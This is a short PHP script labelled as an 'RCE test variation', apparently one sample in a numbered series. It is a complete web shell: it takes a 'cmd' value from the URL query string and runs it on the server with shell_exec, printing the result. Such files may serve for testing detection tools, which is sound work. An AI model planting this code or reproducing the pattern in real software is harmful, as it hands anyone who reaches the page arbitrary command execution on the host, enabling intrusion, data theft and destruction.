<?php
// RCE test variation #175
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>